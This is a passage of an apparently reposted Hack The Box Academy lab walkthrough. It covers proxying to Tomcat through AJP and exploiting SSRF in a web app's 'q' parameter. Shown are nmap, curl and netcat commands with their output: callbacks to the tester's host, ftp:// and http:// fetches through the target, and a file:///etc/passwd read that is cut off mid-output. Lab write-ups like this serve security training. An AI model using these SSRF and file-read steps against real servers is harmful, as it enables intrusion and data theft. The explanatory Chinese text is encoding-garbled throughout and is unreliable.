class="separator" /&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="asf-box"&gt;</span><br><span class="line">                &lt;h1&gt;Apache Tomcat/X.X.XX&lt;/h1&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="upper" class="curved container"&gt;</span><br><span class="line">                &lt;div id="congrats" class="curved container"&gt;</span><br><span class="line">                    &lt;h2&gt;If you're seeing this, you've successfully installed Tomcat. Congratulations!&lt;/h2&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>å¹¸è¿çš„æ˜¯ï¼ŒApacheä¸ºæˆ‘ä»¬é¢„ç¼–è¯‘äº†AJPæ¨¡å—ã€‚æˆ‘ä»¬å°†éœ€è¦å®‰è£…å®ƒï¼Œè™½ç„¶ï¼Œå› ä¸ºå®ƒä¸æ¥åœ¨é»˜è®¤å®‰è£…ã€‚åœ¨æˆ‘ä»¬çš„ApacheæœåŠ¡å™¨ä¸­é…ç½®AJP-Proxyå¯ä»¥å¦‚ä¸‹å®Œæˆï¼š</p>
<ul>
<li>å®‰è£…libapache 2-mod-jkåŒ…</li>
<li>ä½¿å¾—æ¨¡å—</li>
<li>åˆ›å»ºæŒ‡å‘ç›®æ ‡AJP-Proxyç«¯å£çš„é…ç½®æ–‡ä»¶</li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong>å¦‚å‰æ‰€è¿°ï¼ŒPwnboxä½¿ç”¨çš„æ˜¯80ç«¯å£ï¼ŒApacheä¹Ÿå°†å…¶ç”¨ä½œé»˜è®¤ç«¯å£ã€‚ä½ å¯ä»¥åœ¨â€œ/etc/apache 2/ports.confâ€ä¸­å°†Apacheçš„é»˜è®¤ç«¯å£æ›´æ”¹ä¸ºä»»ä½•å…¶ä»–ç«¯å£ã€‚å¦‚æœä½ ä½¿ç”¨8080ç«¯å£ï¼Œåˆ«å¿˜äº†æå‰ç”¨<code>sudo nginx -s  stop</code>åœæ­¢nginxã€‚åœ¨ä¸‹é¢çš„é…ç½®ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯8009ï¼Œè¿™æ˜¯Tomcatçš„é»˜è®¤AJPç«¯å£ï¼Œè¿™æ˜¯æˆ‘ä»¬åœ¨çœŸå®çš„ç¯å¢ƒä¸­ä½¿ç”¨å®ƒçš„æ–¹å¼ã€‚ä½†æ˜¯ï¼Œè¦å®Œæˆä¸Šä¸€èŠ‚æœ«å°¾çš„ç»ƒä¹ ï¼Œè¿™æ¬¡ä½¿ç”¨Apacheï¼Œæ‚¨åº”è¯¥æŒ‡å®šè¦ç”Ÿæˆçš„ç›®æ ‡çš„IPå’Œç«¯å£ï¼ˆå®ƒä»¬éƒ½å°†åœ¨â€œTargetï¼šâ€œæ—è¾¹å¯è§ï¼‰ã€‚æ‚¨å°†çœ‹åˆ°çš„ç«¯å£å®é™…ä¸Šæ˜ å°„åˆ°åº•å±‚Dockerå®¹å™¨çš„ç«¯å£8009ã€‚</p>
<p>æ‰€éœ€çš„å‘½ä»¤å’Œé…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š                                                             </p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo apt install libapache2-mod-jk</span><br><span class="line">mikannse7@htb[/htb]$ sudo a2enmod proxy_ajp</span><br><span class="line">mikannse7@htb[/htb]$ sudo a2enmod proxy_http</span><br><span class="line">mikannse7@htb[/htb]$ export TARGET="&lt;TARGET_IP&gt;"</span><br><span class="line">mikannse7@htb[/htb]$ echo -n """&lt;Proxy *&gt;</span><br><span class="line">Order allow,deny</span><br><span class="line">Allow from all</span><br><span class="line">&lt;/Proxy&gt;</span><br><span class="line">ProxyPass / ajp://$TARGET:8009/</span><br><span class="line">ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf</span><br><span class="line">mikannse7@htb[/htb]$ sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf</span><br><span class="line">mikannse7@htb[/htb]$ sudo systemctl start apache2</span><br></pre></td></tr></tbody></table></figure>

<p><strong>æ³¨æ„ï¼š</strong>ä¸‹é¢çš„cURLå‘½ä»¤æ˜¯æ‚¨é€šå¸¸ä½¿ç”¨çš„å‘½ä»¤ï¼Œå› ä¸ºApacheé»˜è®¤ä¾¦å¬ç«¯å£80ã€‚è¯·è®°ä½ï¼Œæ‚¨å¿…é¡»å°†ç«¯å£80æ›´æ”¹ä¸ºæ‚¨é€‰æ‹©çš„å¦ä¸€ä¸ªç«¯å£ã€‚å› æ­¤ï¼Œä¸ºäº†å®Œæˆä¸Šä¸€èŠ‚çš„ç»ƒä¹ ï¼Œä¸‹ä¸€æ­¥æ˜¯åœ¨ä½¿ç”¨cURLæ—¶æŒ‡å®šæ‚¨é€‰æ‹©çš„ç«¯å£ï¼Œä¾‹å¦‚â€œcurl <a href="http://127.0.0.1:8080â€œã€‚">http://127.0.0.1:8080â€œã€‚</a></p>
<h4 id="Accessing-the-â€œhiddenâ€-Tomcat-page"><a href="#Accessing-the-â€œhiddenâ€-Tomcat-page" class="headerlink" title="Accessing the â€œhiddenâ€ Tomcat page"></a>Accessing the â€œhiddenâ€ Tomcat page</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl http://127.0.0.1</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang="en"&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset="UTF-8" /&gt;</span><br><span class="line">        &lt;title&gt;Apache Tomcat/X.X.XX&lt;/title&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="favicon.ico" rel="shortcut icon" type="image/x-icon" /&gt;</span><br><span class="line">        &lt;link href="tomcat.css" rel="stylesheet" type="text/css" /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;div id="wrapper"&gt;</span><br><span class="line">            &lt;div id="navigation" class="curved container"&gt;</span><br><span class="line">                &lt;span id="nav-home"&gt;&lt;a href="https://tomcat.apache.org/"&gt;Home&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-hosts"&gt;&lt;a href="/docs/"&gt;Documentation&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-config"&gt;&lt;a href="/docs/config/"&gt;Configuration&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-examples"&gt;&lt;a href="/examples/"&gt;Examples&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-wiki"&gt;&lt;a href="https://wiki.apache.org/tomcat/FrontPage"&gt;Wiki&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-lists"&gt;&lt;a href="https://tomcat.apache.org/lists.html"&gt;Mailing Lists&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;span id="nav-help"&gt;&lt;a href="https://tomcat.apache.org/findhelp.html"&gt;Find Help&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">                &lt;br class="separator" /&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="asf-box"&gt;</span><br><span class="line">                &lt;h1&gt;Apache Tomcat/X.X.XX&lt;/h1&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">            &lt;div id="upper" class="curved container"&gt;</span><br><span class="line">                &lt;div id="congrats" class="curved container"&gt;</span><br><span class="line">                    &lt;h2&gt;If you're seeing this, you've successfully installed Tomcat. Congratulations!&lt;/h2&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>å¦‚æœæˆ‘ä»¬æ­£ç¡®é…ç½®äº†æ‰€æœ‰å†…å®¹ï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿä½¿ç”¨cURLå’ŒWebæµè§ˆå™¨è®¿é—®Apache Tomcatç®¡ç†å™¨ã€‚</p>
<p><img src="https://academy.hackthebox.com/storage/modules/145/img/tomcat.png" alt="image"></p>
<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆ<code>SSRF</code>ï¼‰æ”»å‡»ï¼Œåˆ—åœ¨OWASPå‰10åä¸­ï¼Œå…è®¸æˆ‘ä»¬æ»¥ç”¨æœåŠ¡å™¨åŠŸèƒ½æ¥ä»£è¡¨æœåŠ¡å™¨æ‰§è¡Œå†…éƒ¨æˆ–å¤–éƒ¨èµ„æºè¯·æ±‚ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦æä¾›æˆ–ä¿®æ”¹ç›®æ ‡åº”ç”¨ç¨‹åºç”¨æ¥è¯»å–æˆ–æäº¤æ•°æ®çš„URLã€‚åˆ©ç”¨SSRFæ¼æ´å¯èƒ½å¯¼è‡´ï¼š</p>
<ul>
<li>ä¸å·²çŸ¥å†…éƒ¨ç³»ç»Ÿäº¤äº’</li>
<li>é€šè¿‡ç«¯å£æ‰«æå‘ç°å†…éƒ¨æœåŠ¡</li>
<li>æ³„éœ²æœ¬åœ°/æ•æ„Ÿæ•°æ®</li>
<li>åœ¨ç›®æ ‡åº”ç”¨ç¨‹åºä¸­åŒ…æ‹¬æ–‡ä»¶</li>
<li>ä½¿ç”¨è·¯å¾„æ³„æ¼NetNTLMå“ˆå¸Œï¼ˆWindowsï¼‰</li>
<li>å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œ</li>
</ul>
<p>æˆ‘ä»¬é€šå¸¸å¯ä»¥åœ¨è·å–è¿œç¨‹èµ„æºçš„åº”ç”¨ç¨‹åºä¸­æ‰¾åˆ°SSRFæ¼æ´ã€‚åœ¨å¯»æ‰¾SSRFæ¼æ´æ—¶ï¼Œæˆ‘ä»¬åº”è¯¥å¯»æ‰¾ï¼š</p>
<ul>
<li>è¯·æ±‚çš„ä¸€éƒ¨åˆ†ï¼ŒåŒ…æ‹¬URL</li>
<li>æ–‡ä»¶å¯¼å…¥ï¼Œå¦‚HTMLã€PDFã€å›¾åƒç­‰ã€‚</li>
<li>è¿œç¨‹æœåŠ¡å™¨è¿æ¥ä»¥è·å–æ•°æ®</li>
<li>APIè§„èŒƒå¯¼å…¥</li>
<li>ä»ªè¡¨æ¿ï¼ŒåŒ…æ‹¬pingå’Œç±»ä¼¼åŠŸèƒ½ï¼Œç”¨äºæ£€æŸ¥æœåŠ¡å™¨çŠ¶æ€</li>
</ul>
<p><strong>æ³¨æ„ï¼š</strong>è¯·å§‹ç»ˆè®°ä½ï¼ŒWebåº”ç”¨ç¨‹åºæ¨¡ç³Šæµ‹è¯•åº”è¯¥æ˜¯ä»»ä½•æ¸—é€æµ‹è¯•æˆ–bugèµé‡‘ç‹©çŒæ´»åŠ¨çš„ä¸€éƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¨¡ç³Šä¸åº”è¯¥ä»…é™äºç”¨æˆ·è¾“å…¥å­—æ®µã€‚å°†æ¨¡ç³Šå¤„ç†æ‰©å±•åˆ°HTTPè¯·æ±‚çš„å„ä¸ªéƒ¨åˆ†ï¼Œæ¯”å¦‚User-Agentã€‚</p>
<h2 id="SSRF-Exploitation-Example"><a href="#SSRF-Exploitation-Example" class="headerlink" title="SSRF Exploitation Example"></a>SSRF Exploitation Example</h2><p>è®©æˆ‘ä»¬é¦–å…ˆåˆ©ç”¨ä¸€ä¸ªé¢å‘äº’è”ç½‘çš„Webåº”ç”¨ç¨‹åºï¼ˆç›®æ ‡å¯ä»¥åœ¨æœ¬èŠ‚åº•éƒ¨ç”Ÿæˆï¼‰ï¼Œç„¶åé€šè¿‡é“¾æ¥å¤šä¸ªSSRFæ¼æ´æ¥åœ¨å†…éƒ¨ä¸»æœºä¸Šè·å¾—è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p>
<table>
<thead>
<tr>
<th><code>[PENTESTER]</code></th>
<th><code>ğŸ –</code></th>
<th><code>[EXERCISE-TARGET]--[SSRF]</code></th>
<th><code>ğŸ –</code></th>
<th><code>[INTERNAL-WEBSERVER]--[SSRF]</code></th>
<th><code>ğŸ –</code></th>
<th><code>[LOCALHOST WEBAPP]</code></th>
<th><code>ğŸ –</code></th>
<th><code>[RCE]</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>å¯¼èˆªåˆ°æœ¬èŠ‚çš„ç»“å°¾å¹¶å•å‡»<code>Click here to spawn the target system!</code>ï¼Œç„¶åä½¿ç”¨æä¾›çš„Pwnboxæˆ–å…·æœ‰æä¾›çš„VPNå¯†é’¥çš„æœ¬åœ°VMæ¥æ²¿ç€ã€‚</p>
<p>å¯¹ä¸»æœºçš„åŸºæœ¬ä¾¦å¯Ÿæ˜¾ç¤ºåªæœ‰ä¸‰ä¸ªå¼€æ”¾ç«¯å£ã€‚</p>
<h4 id="Nmap-Discovering-Open-Ports-Nmap"><a href="#Nmap-Discovering-Open-Ports-Nmap" class="headerlink" title="Nmap - Discovering Open Ports Nmap"></a>Nmap - Discovering Open Ports Nmap</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ nmap -sT -T5 --min-rate=10000 -p- &lt;TARGET IP&gt;</span><br><span class="line"></span><br><span class="line">Nmap scan report for &lt;TARGET IP&gt;</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 65532 filtered ports</span><br><span class="line">PORT    STATE  SERVICE</span><br><span class="line">22/tcp  open   ssh</span><br><span class="line">80/tcp  open   http</span><br><span class="line">8080/tcp open  http-proxy</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds</span><br></pre></td></tr></tbody></table></figure>

<p>è®©æˆ‘ä»¬å‘ç›®æ ‡æœåŠ¡å™¨å‘å‡ºä¸€ä¸ªcURLrequestï¼Œä½¿ç”¨å‚æ•°<code>-i</code>æ˜¾ç¤ºåè®®å“åº”å¤´ï¼Œä½¿ç”¨å‚æ•°<code>-s</code>ä½¿ç”¨é™é»˜æ¨¡å¼ã€‚</p>
<h4 id="Curl-Interacting-with-the-Target"><a href="#Curl-Interacting-with-the-Target" class="headerlink" title="Curl - Interacting with the Target"></a>Curl - Interacting with the Target</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s http://&lt;TARGET IP&gt;</span><br><span class="line"></span><br><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 242</span><br><span class="line">Location: http://&lt;TARGET IP&gt;/load?q=index.html</span><br><span class="line">Server: Werkzeug/2.0.2 Python</span><br><span class="line">Date: Mon, 18 Oct 2021 09:01:02 GMT</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span><br><span class="line">&lt;title&gt;Redirecting...&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Redirecting...&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;You should be redirected automatically to target URL: &lt;a href="/load?q=index.html"&gt;/load?q=index.html&lt;/a&gt;. If not click the link.</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯·æ±‚é‡å®šå‘åˆ°<code>/load?q=index.html</code>ï¼Œè¿™æ„å‘³ç€<code>q</code>å‚æ•°è·å–èµ„æº<code>index.html</code>ã€‚è®©æˆ‘ä»¬æŒ‰ç…§é‡å®šå‘ï¼Œçœ‹çœ‹æˆ‘ä»¬æ˜¯å¦å¯ä»¥æ”¶é›†ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s -L http://&lt;TARGET IP&gt;</span><br><span class="line"></span><br><span class="line">HTTP/1.0 302 FOUND</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 242</span><br><span class="line">Location: http://&lt;TARGET IP&gt;/load?q=index.html</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Mon, 18 Oct 2021 10:20:27 GMT</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 153</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Mon, 18 Oct 2021 10:20:27 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;!-- ubuntu-web.lalaguna.local &amp; internal.app.local load resources via q parameter --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad App&lt;/h1&gt;</span><br><span class="line">&lt;a&gt;Hello World!&lt;/a&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>æ´¾ç”Ÿçš„ç›®æ ‡æ˜¯<code>ubuntu-web.lalaguna.local</code>ï¼Œ<code>internal.app.local</code>æ˜¯å†…éƒ¨ç½‘ç»œä¸Šçš„åº”ç”¨ç¨‹åºï¼ˆä»æˆ‘ä»¬å½“å‰çš„ä½ç½®æ— æ³•è®¿é—®ï¼‰ã€‚</p>
<p>ä¸‹ä¸€æ­¥æ˜¯ç¡®è®¤<code>q</code>å‚æ•°æ˜¯å¦æ˜“å—SSRFæ”»å‡»ã€‚å¦‚æœæ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨SSRFæ¼æ´è®¿é—®å†…éƒ¨çš„.app.local Webåº”ç”¨ç¨‹åºã€‚æˆ‘ä»¬è¯´â€œå¯èƒ½â€æ˜¯å› ä¸º<code>ubuntu-web</code>å¯èƒ½å­˜åœ¨ä¿¡ä»»å…³ç³»ï¼Œèƒ½å¤Ÿä¸<code>internal.app.local</code>è”ç³»å¹¶è¿›è¡Œäº¤äº’ã€‚è¿™ç§ç±»å‹çš„å…³ç³»å¯ä»¥æ˜¯ç®€å•çš„é˜²ç«å¢™è§„åˆ™ï¼ˆç”šè‡³æ²¡æœ‰ä»»ä½•é˜²ç«å¢™è§„åˆ™ï¼‰ã€‚</p>
<p>åœ¨ä¸€ä¸ªç»ˆç«¯ä¸­ï¼Œè®©æˆ‘ä»¬ä½¿ç”¨Netcatç›‘å¬ç«¯å£8080ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚</p>
<h4 id="Netcat-Listener"><a href="#Netcat-Listener" class="headerlink" title="Netcat Listener"></a>Netcat Listener</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ nc -nvlp 8080</span><br><span class="line"></span><br><span class="line">listening on [any] 8080 ...</span><br></pre></td></tr></tbody></table></figure>

<p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬åœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ä½¿ç”¨<code>http://&lt;VPN/TUN Adapter IP&gt;</code>è€Œä¸æ˜¯<code>index.html</code>å‘ç›®æ ‡Webåº”ç”¨ç¨‹åºå‘å‡ºè¯·æ±‚ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚<code>&lt;VPN/TUN Adapter IP&gt;</code>å°†æ˜¯Pwnboxçš„TUNé€‚é…å™¨IPæˆ–æ‚¨å¯èƒ½æ­£åœ¨ä½¿ç”¨çš„æœ¬åœ°VMçš„TUNé€‚é…å™¨IPï¼ˆåœ¨ä½¿ç”¨æä¾›çš„VPNå¯†é’¥è¿æ¥åï¼‰ã€‚</p>
<h4 id="Curl-Testing-for-SSRF"><a href="#Curl-Testing-for-SSRF" class="headerlink" title="Curl - Testing for SSRF"></a>Curl - Testing for SSRF</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:8080"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 0</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Mon, 18 Oct 2021 12:07:10 GMT</span><br></pre></td></tr></tbody></table></figure>

<p>æˆ‘ä»¬å°†é€šè¿‡ç›®æ ‡æœåŠ¡å™¨ä½¿ç”¨<a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a>å‘å‡ºçš„è¯·æ±‚ï¼Œåœ¨Netcatç›‘å¬å™¨ä¸­æ¥æ”¶ä»¥ä¸‹å†…å®¹ï¼Œä»¥ç¡®è®¤SSRFæ¼æ´ï¼š</p>
<h4 id="Netcat-Listener-Confirming-SSRF"><a href="#Netcat-Listener-Confirming-SSRF" class="headerlink" title="Netcat Listener - Confirming SSRF"></a>Netcat Listener - Confirming SSRF</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Connection received on &lt;TARGET IP&gt; 49852</span><br><span class="line">GET / HTTP/1.1</span><br><span class="line">Accept-Encoding: identity</span><br><span class="line">Host: &lt;VPN/TUN Adapter IP&gt;:8080</span><br><span class="line">User-Agent: Python-urllib/3.8</span><br><span class="line">Connection: close</span><br></pre></td></tr></tbody></table></figure>

<p>é˜…è¯»<a target="_blank" rel="noopener" href="https://docs.python.org/3.8/library/urllib.html">Python-urllib</a>æ–‡æ¡£ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å®ƒæ”¯æŒ<code>file</code>ã€<code>http</code>å’Œ<code>ftp</code>æ¨¡å¼ã€‚å› æ­¤ï¼Œé™¤äº†ä»£è¡¨ç›®æ ‡åº”ç”¨ç¨‹åºå‘å…¶ä»–æœåŠ¡å‘å‡ºHTTPè¯·æ±‚å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡<code>file</code>æ¨¡å¼è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨<code>ftp</code>è¯»å–è¿œç¨‹æ–‡ä»¶ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤æµ‹è¯•æ­¤åŠŸèƒ½ï¼š</p>
<ol>
<li>åˆ›å»ºåä¸ºindex.htmlçš„æ–‡ä»¶</li>
</ol>
<p>Code: </p>
<figure class="highlight html"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span>&gt;</span>SSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>åœ¨index.htmlæ‰€åœ¨çš„ç›®å½•ä¸­ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯åŠ¨HTTPæœåŠ¡å™¨</li>
</ol>
<h4 id="Start-Python-HTTP-Server"><a href="#Start-Python-HTTP-Server" class="headerlink" title="Start Python HTTP Server"></a>Start Python HTTP Server</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ python3 -m http.server 9090</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>åœ¨index.htmlæ‰€åœ¨çš„ç›®å½•ä¸­ï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤å¯åŠ¨FTPæœåŠ¡å™¨</li>
</ol>
<h4 id="Start-FTP-Server"><a href="#Start-FTP-Server" class="headerlink" title="Start FTP Server"></a>Start FTP Server</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ sudo pip3 install twisted</span><br><span class="line">mikannse7@htb[/htb]$ sudo python3 -m twisted ftp -p 21 -r .</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>ä½¿ç”¨<code>ftp</code>æ¨¡å¼é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºé‡æ–°ç¼–è¯‘index.htmlï¼Œå¦‚ä¸‹æ‰€ç¤º</li>
</ol>
<h4 id="FTP-Schema-é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶-FTPæ¶æ„"><a href="#FTP-Schema-é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶-FTPæ¶æ„" class="headerlink" title="FTP Schema é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶- FTPæ¶æ„"></a>FTP Schema é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶- FTPæ¶æ„</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=ftp://&lt;VPN/TUN Adapter IP&gt;/index.html"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:21:09 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a&gt;SSRF&lt;/a&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>ä½¿ç”¨<code>ftp</code>æ¨¡å¼é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºé‡æ–°ç¼–è¯‘index.htmlï¼Œå¦‚ä¸‹æ‰€ç¤º</li>
</ol>
<h4 id="é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶-HTTPæ¨¡å¼"><a href="#é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶-HTTPæ¨¡å¼" class="headerlink" title="é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶- HTTPæ¨¡å¼"></a>é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢è¿œç¨‹æ–‡ä»¶- HTTPæ¨¡å¼</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=http://&lt;VPN/TUN Adapter IP&gt;:9090/index.html"</span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 41</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:26:18 GMT</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;a&gt;SSRF&lt;/a&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;html&gt;</span><br></pre></td></tr></tbody></table></figure>

<ol>
<li>ä½¿ç”¨æ–‡ä»¶æ¶æ„é‡æ–°ç¼–è¯‘æœ¬åœ°æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤º</li>
</ol>
<h4 id="é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„"><a href="#é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„" class="headerlink" title="é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„"></a>é€šè¿‡ç›®æ ‡åº”ç”¨ç¨‹åºæ£€ç´¢æœ¬åœ°æ–‡ä»¶-æ–‡ä»¶æ¶æ„</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">mikannse7@htb[/htb]$ curl -i -s "http://&lt;TARGET IP&gt;/load?q=file:///etc/passwd" </span><br><span class="line"></span><br><span class="line">HTTP/1.0 200 OK</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 926</span><br><span class="line">Server: Werkzeug/2.0.2 Python/3.8.12</span><br><span class="line">Date: Tue, 19 Oct 2021 11:27:17 GMT</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span 